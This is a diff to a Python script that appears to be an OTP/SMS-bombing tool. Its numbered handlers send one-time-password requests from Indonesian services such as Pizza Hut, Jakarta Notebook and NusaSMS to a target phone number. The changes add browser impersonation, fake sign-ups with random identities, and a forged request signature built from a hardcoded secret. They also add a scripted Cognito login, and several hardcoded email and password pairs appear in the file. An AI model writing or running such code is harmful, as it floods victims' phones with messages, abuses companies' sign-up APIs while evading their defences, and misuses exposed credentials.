@@ -1153,25 +1153,48 @@ def send_generasi_otp(phone_input):
 
 # ==================== HANDLER 34: INSUREKA ====================
 def send_insureka_otp(phone_input):
-    p = normalize(phone_input)
+    p          = normalize(phone_input)
     phone_plus = p['fmt_plus']
-    BASE_URL = "https://insureka.co.id"
-    sess = requests.Session()
+    BASE_URL   = "https://insureka.co.id"
+    sess       = requests.Session()
     try:
-        resp = sess.get(f"{BASE_URL}/id/login/", headers={"User-Agent": get_random_user_agent(), "Accept": "text/html,application/xhtml+xml,*/*;q=0.9", "Accept-Language": "id", "Accept-Encoding": "gzip, deflate"}, timeout=10, verify=False)
+        sess.get(
+            f"{BASE_URL}/id/login/",
+            headers={
+                "User-Agent":      get_random_user_agent(),
+                "Accept":          "text/html,application/xhtml+xml,*/*;q=0.9",
+                "Accept-Language": "id",
+                "Accept-Encoding": "gzip, deflate",
+            },
+            timeout=10, verify=False,
+        )
         csrf = sess.cookies.get("csrftoken", "")
         if not csrf:
             return None, "csrf not found"
-        resp2 = sess.post(f"{BASE_URL}/api/v1/auth/send-otp/", headers={
-            "accept": "*/*", "accept-encoding": "gzip, deflate", "accept-language": "id",
-            "content-type": "application/json; charset=UTF-8", "origin": BASE_URL,
-            "priority": "u=1, i", "referer": f"{BASE_URL}/id/login/",
-            "sec-ch-ua": '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
-            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
-            "user-agent": get_random_user_agent(), "x-csrftoken": csrf,
-        }, json={"phone": phone_plus}, timeout=15, verify=False)
-        return resp2.status_code, resp2.text
+
+        resp = sess.post(
+            f"{BASE_URL}/api/v1/auth/send-otp/",
+            headers={
+                "accept":             "*/*",
+                "accept-encoding":    "gzip, deflate",
+                "accept-language":    "id",
+                "content-type":       "application/json; charset=UTF-8",
+                "origin":             BASE_URL,
+                "priority":           "u=1, i",
+                "referer":            f"{BASE_URL}/id/login/",
+                "sec-ch-ua":          '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
+                "sec-ch-ua-mobile":   "?0",
+                "sec-ch-ua-platform": '"Windows"',
+                "sec-fetch-dest":     "empty",
+                "sec-fetch-mode":     "cors",
+                "sec-fetch-site":     "same-origin",
+                "user-agent":         get_random_user_agent(),
+                "x-csrftoken":        csrf,
+            },
+            json={"phone": phone_plus},
+            timeout=15, verify=False,
+        )
+        return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
 
@@ -1344,9 +1367,45 @@ def send_garasi_otp(phone_input):
         return None, str(e)
 
 # ==================== HANDLER 40: JAKARTA NOTEBOOK ====================
-def send_jakartanote_otp(phone_input, bearer: str):
-    p = normalize(phone_input)
+import boto3
+from botocore.exceptions import ClientError
+
+COGNITO_REGION    = "ap-southeast-1"
+COGNITO_CLIENT_ID = "479jjabcfocf6veo4am3dt4p8m"
+_JN_EMAIL         = "dddawwsstd@gmail.com"
+_JN_PASSWD        = "ddasdw@$!@%@sS"
+
+def normalize(no):
+    no = no.strip().replace(" ", "").replace("-", "")
+    if no.startswith("+62"):  bare = no[3:]
+    elif no.startswith("62"): bare = no[2:]
+    elif no.startswith("08"): bare = no[1:]
+    elif no.startswith("8"):  bare = no
+    else:                     bare = no
+    return {"fmt_08": "0" + bare, "bare": bare}
+
+def _jn_cognito_login() -> str:
+    client = boto3.client("cognito-idp", region_name=COGNITO_REGION)
+    try:
+        resp = client.initiate_auth(
+            AuthFlow="USER_PASSWORD_AUTH",
+            AuthParameters={"USERNAME": _JN_EMAIL, "PASSWORD": _JN_PASSWD},
+            ClientId=COGNITO_CLIENT_ID,
+        )
+        return resp["AuthenticationResult"]["AccessToken"]
+    except ClientError as e:
+        return ""
+    except Exception:
+        return ""
+
+def send_jakartanote_otp(phone_input):
+    p        = normalize(phone_input)
     phone_08 = p['fmt_08']
+
+    bearer = _jn_cognito_login()
+    if not bearer:
+        return None, "cognito login failed"
+
     GRAPHQL_URL = "https://graphql.jakartanotebook.com/graphql/v3"
     MUTATION = """mutation CreatePhoneNumberOtp($requestBody: CreateMemberOtpRequestInput!) {
   createMemberOtp(requestBody: $requestBody) {
@@ -1354,19 +1413,25 @@ def send_jakartanote_otp(phone_input, bearer: str):
   }
 }"""
     headers = {
-        "accept": "*/*", "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "id,en-US;q=0.9,en;q=0.8",
-        "authorization": f"Bearer {bearer}", "content-type": "application/json",
-        "origin": "https://www.jakartanotebook.com", "referer": "https://www.jakartanotebook.com/",
-        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
-        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
+        "accept":             "*/*",
+        "accept-encoding":    "gzip, deflate, br, zstd",
+        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
+        "authorization":      f"Bearer {bearer}",
+        "content-type":       "application/json",
+        "origin":             "https://www.jakartanotebook.com",
+        "referer":            "https://www.jakartanotebook.com/",
+        "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
+        "sec-ch-ua-mobile":   "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest":     "empty",
+        "sec-fetch-mode":     "cors",
+        "sec-fetch-site":     "same-site",
+        "user-agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
     }
     payload = {
         "operationName": "CreatePhoneNumberOtp",
-        "variables": {"requestBody": {"phoneNumber": phone_08}},
-        "query": MUTATION,
+        "variables":     {"requestBody": {"phoneNumber": phone_08}},
+        "query":         MUTATION,
     }
     try:
         resp = requests.post(GRAPHQL_URL, headers=headers, json=payload, timeout=15, verify=False)
@@ -1475,56 +1540,112 @@ def send_bmsecure_aci_otp(phone_input):
     except Exception as e:
         return None, str(e)
 
-# ==================== HANDLER 44: PIZZAHUT ====================
-'''
-import tls_client as _tls_client2
+# ==================== HANDLER: PIZZAHUT ====================
+from curl_cffi.requests import Session
 
-_PH2_BASE      = "https://api-prod.pizzahut.co.id"
-_PH2_SIGNATURE = "ae5ac5c8c7c217aa0e277eaec9b2589878a27dd49b2310b621cdf613d055c314"
-_PH2_CLIENT_ID = "b39773b0-435b-4f41-80e9-163eef20e0ab"
+BASE_URL  = "https://api-prod.pizzahut.co.id"
+ORIGIN    = "https://www.pizzahut.co.id"
+REFERER   = "https://www.pizzahut.co.id/"
+CLIENT_ID = "b39773b0-435b-4f41-80e9-163eef20e0ab"
+SECRET    = "qCDXXjrx4oJBILESieykMyQ7n5UZtrjc"
 
-def send_pizzahut_otp2(phone_input):
-    p = normalize(phone_input)
-    bare = p['bare']
-    device_id = f"{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:6]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:6]}"
-    session = _tls_client2.Session(client_identifier="chrome_131", random_tls_extension_order=True)
-    headers = {
-        "accept": "application/json", "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "id,en-US;q=0.9,en;q=0.8",
-        "content-type": "application/x-www-form-urlencoded",
-        "origin": "https://www.pizzahut.co.id", "priority": "u=1, i",
-        "referer": "https://www.pizzahut.co.id/",
-        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"',
-        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
-        "x-channel": "2", "x-client-id": _PH2_CLIENT_ID, "x-device-id": device_id,
-        "x-device-type": "PC", "x-lang": "en", "x-platform": "WEBDESKTOP",
-        "x-signature": _PH2_SIGNATURE,
+def _random_device_id():
+    return f"{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:6]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:6]}"
+
+def _random_email():
+    return "".join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
+
+def _random_name():
+    return "".join(random.choices(string.ascii_lowercase, k=5)).capitalize()
+
+def _random_birthday():
+    return f"{random.randint(1990,2002)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}"
+
+def _make_signature(payload: dict) -> str:
+    s = json.dumps(payload, separators=(",", ":"))
+    h1 = hashlib.sha256(s.encode()).hexdigest().lower()
+    h2 = hashlib.sha256((h1 + SECRET).encode()).hexdigest().lower()
+    return h2
+
+def _common_headers(device_id: str, signature: str = "") -> dict:
+    h = {
+        "accept":             "application/json",
+        "accept-encoding":    "gzip, deflate, br, zstd",
+        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
+        "content-type":       "application/json",
+        "origin":             ORIGIN,
+        "referer":            REFERER,
+        "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
+        "sec-ch-ua-mobile":   "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest":     "empty",
+        "sec-fetch-mode":     "cors",
+        "sec-fetch-site":     "same-site",
+        "user-agent":         get_random_user_agent(),
+        "x-channel":          "2",
+        "x-client-id":        CLIENT_ID,
+        "x-device-id":        device_id,
+        "x-device-type":      "PC",
+        "x-lang":             "en",
+        "x-platform":         "WEBDESKTOP",
     }
+    if signature:
+        h["x-signature"] = signature
+    return h
+
+def send_pizzahut_otp(phone_input):
+    p         = normalize(phone_input)
+    phone     = p['bare']
+    device_id = _random_device_id()
+    sess      = Session(impersonate="chrome124")
+
+    # Step 1: register
     reg_payload = {
-        "birthday": f"{random.randint(1990,2002)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}",
-        "email": ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com",
-        "first_name": ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize(),
-        "last_name":  ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize(),
-        "phone": bare,
+        "birthday":   _random_birthday(),
+        "email":      _random_email(),
+        "first_name": _random_name(),
+        "last_name":  _random_name(),
+        "phone":      phone,
     }
+    sig = _make_signature(reg_payload)
     try:
-        reg = session.post(f"{_PH2_BASE}/customer/v5/customer/register",
-                           headers=headers, data=reg_payload, timeout_seconds=15)
-        if reg.status_code == 200:
-            data = reg.json()
-            key = (data.get("key") or (data.get("data") or {}).get("key")
-                   or (data.get("result") or {}).get("key"))
-            if key:
-                otp = session.post(f"{_PH2_BASE}/customer/v1/customer/send-otp",
-                                   headers={**headers, "content-type": "application/json"},
-                                   json={"key": key, "type": 1}, timeout_seconds=15)
-                return otp.status_code, otp.text
-        return reg.status_code, reg.text
+        r = sess.post(
+            f"{BASE_URL}/customer/v5/customer/register",
+            headers=_common_headers(device_id, sig),
+            json=reg_payload,
+            timeout=15,
+            verify=False,
+        )
+        if r.status_code != 200:
+            return r.status_code, r.text
+        data = r.json()
+        key  = (
+            data.get("key")
+            or (data.get("data") or {}).get("key")
+            or (data.get("result") or {}).get("key")
+        )
     except Exception as e:
         return None, str(e)
-'''
+
+    if not key:
+        return None, "key not found in register response"
+
+    # Step 2: send-otp
+    otp_payload = {"key": key, "type": 1}
+    sig2 = _make_signature(otp_payload)
+    try:
+        resp = sess.post(
+            f"{BASE_URL}/customer/v1/customer/send-otp",
+            headers=_common_headers(device_id, sig2),
+            json=otp_payload,
+            timeout=15,
+            verify=False,
+        )
+        return resp.status_code, resp.text
+    except Exception as e:
+        return None, str(e)
+
+
 # ==================== HANDLER 45: SEGARI ====================
 def send_segari_otp2(phone_input):
     p = normalize(phone_input)
@@ -1758,34 +1879,33 @@ def send_kpoin_otp(phone_input):
     except Exception as e:
         return None, str(e)
 
-# ==================== HANDLER 53: NUSASMS ====================
-def send_nusasms_otp(phone_input):
-    # Flow: seed → verify (get signupToken) → sendotp (form-encoded)
-    p = normalize(phone_input)
+# ==================== HANDLER 74: NUSASMS ====================
+def _rng_str(n):
+    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
+
+def _rng_pass():
+    return (
+        random.choice(string.ascii_uppercase)
+        + random.choice(string.ascii_lowercase)
+        + random.choice(string.digits)
+        + random.choice("!@#$%^&*")
+        + _rng_str(6)
+    )
+
+def send_nusa_otp(phone_input):
+    p        = normalize(phone_input)
     phone_08 = p['fmt_08']
-    phone_62 = p['fmt_62']
-
-    def _rng_str(n):
-        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
-
-    def _rng_pass():
-        return (
-            random.choice(string.ascii_uppercase)
-            + random.choice(string.ascii_lowercase)
-            + random.choice(string.digits)
-            + random.choice("!@#$%^&*")
-            + _rng_str(6)
-        )
-
     user_id  = _rng_str(12)
     password = _rng_pass()
     email    = _rng_str(8) + "@gmail.com"
 
     sess = requests.Session()
     try:
-        sess.get("https://app.nusasms.com/freetrial",
-                 headers={"User-Agent": get_random_user_agent()},
-                 timeout=10, verify=False)
+        sess.get(
+            "https://app.nusasms.com/freetrial",
+            headers={"User-Agent": get_random_user_agent()},
+            timeout=10, verify=False,
+        )
     except Exception:
         pass
 
@@ -1817,21 +1937,26 @@ def send_nusasms_otp(phone_input):
         "serviceType": "masking",
         "phoneNumber": phone_08,
     }
+    r = None
     try:
-        r = sess.post("https://app.nusasms.com/processSignup?action=verify",
-                      headers=base_hdrs, data=verify_form, timeout=15, verify=False)
+        r = sess.post(
+            "https://app.nusasms.com/processSignup?action=verify",
+            headers=base_hdrs, data=verify_form, timeout=15, verify=False,
+        )
         verify_resp = r.json() if r.text else {}
     except Exception as e:
         return None, str(e)
 
     if "signupToken" not in verify_resp:
-        return r.status_code if r else None, str(verify_resp)
+        return (r.status_code if r else None), str(verify_resp)
 
     # Step 2: sendotp — kirim verify response + otpType
     otp_form = {**verify_resp, "otpType": "wa"}
     try:
-        resp = sess.post("https://app.nusasms.com/processSignup?action=sendotp",
-                         headers=base_hdrs, data=otp_form, timeout=15, verify=False)
+        resp = sess.post(
+            "https://app.nusasms.com/processSignup?action=sendotp",
+            headers=base_hdrs, data=otp_form, timeout=15, verify=False,
+        )
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
@@ -2382,12 +2507,12 @@ def send_easycash_otp(phone_input):
 
     static_cookies = {
         "sajssdk_2015_cross_new_user": "1",
-        "_fbp":            "fb.1.1726404364208.304406689168566354",
+        "_fbp":             "fb.1.1726404364208.304406689168566354",
         "_tt_enable_cookie": "1",
-        "_ttp":            "jyUZUOglVrrmkdG37oUf2jq1eVS",
-        "_ga":             "GA1.1.512112514.1726404367",
-        "_gcl_au":         "1.1.552118675.1726404367",
-        "_ttd_sync":       "1",
+        "_ttp":             "jyUZUOglVrrmkdG37oUf2jq1eVS",
+        "_ga":              "GA1.1.512112514.1726404367",
+        "_gcl_au":          "1.1.552118675.1726404367",
+        "_ttd_sync":        "1",
     }
     merged = {**static_cookies, **dict(sess.cookies)}
     merged["deviceToken"] = device_token
@@ -2427,7 +2552,6 @@ def send_easycash_otp(phone_input):
     except Exception as e:
         return None, str(e)
 
-
 # ==================== HANDLER 72: KREDITPINTAR ====================
 def send_kreditpintar_otp(phone_input):
     p = normalize(phone_input)
@@ -2443,21 +2567,21 @@ def send_kreditpintar_otp(phone_input):
     except Exception:
         pass
     headers = {
-        "Host":              "go.kreditpintar.com",
-        "Connection":        "keep-alive",
+        "Host":               "go.kreditpintar.com",
+        "Connection":         "keep-alive",
         "sec-ch-ua-platform": '"Android"',
-        "User-Agent":        get_random_user_agent(),
-        "Accept":            "application/json, text/plain, */*",
-        "sec-ch-ua":         '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "Content-Type":      "application/json",
-        "sec-ch-ua-mobile":  "?1",
-        "Origin":            BASE_URL,
-        "Sec-Fetch-Site":    "same-origin",
-        "Sec-Fetch-Mode":    "cors",
-        "Sec-Fetch-Dest":    "empty",
-        "Referer":           f"{BASE_URL}/daftar",
-        "Accept-Encoding":   "gzip, deflate, br, zstd",
-        "Accept-Language":   "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+        "User-Agent":         get_random_user_agent(),
+        "Accept":             "application/json, text/plain, */*",
+        "sec-ch-ua":          '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+        "Content-Type":       "application/json",
+        "sec-ch-ua-mobile":   "?1",
+        "Origin":             BASE_URL,
+        "Sec-Fetch-Site":     "same-origin",
+        "Sec-Fetch-Mode":     "cors",
+        "Sec-Fetch-Dest":     "empty",
+        "Referer":            f"{BASE_URL}/daftar",
+        "Accept-Encoding":    "gzip, deflate, br, zstd",
+        "Accept-Language":    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
     }
     payload = {"mobileNumber": phone_08}
     try:
@@ -2469,11 +2593,7 @@ def send_kreditpintar_otp(phone_input):
     except Exception as e:
         return None, str(e)
 
-
 # ==================== HANDLER 73: SKILLACADEMY ====================
-import base64 as _b64
-import json as _json_sa
-
 _SA_EMAIL  = "azbantara@gmail.com"
 _SA_PASSWD = "4i_juLyPPgQ2396"
 _SA_GW     = "https://gw.ruangguru.com"
@@ -2529,7 +2649,7 @@ def _sa_hdrs_sa():
 
 def send_skillacademy_otp(phone_input):
     p = normalize(phone_input)
-    target = p['bare']  # 8xxxxxxxxx
+    target = p['bare']
     sess = requests.Session()
 
     # Step 1: login
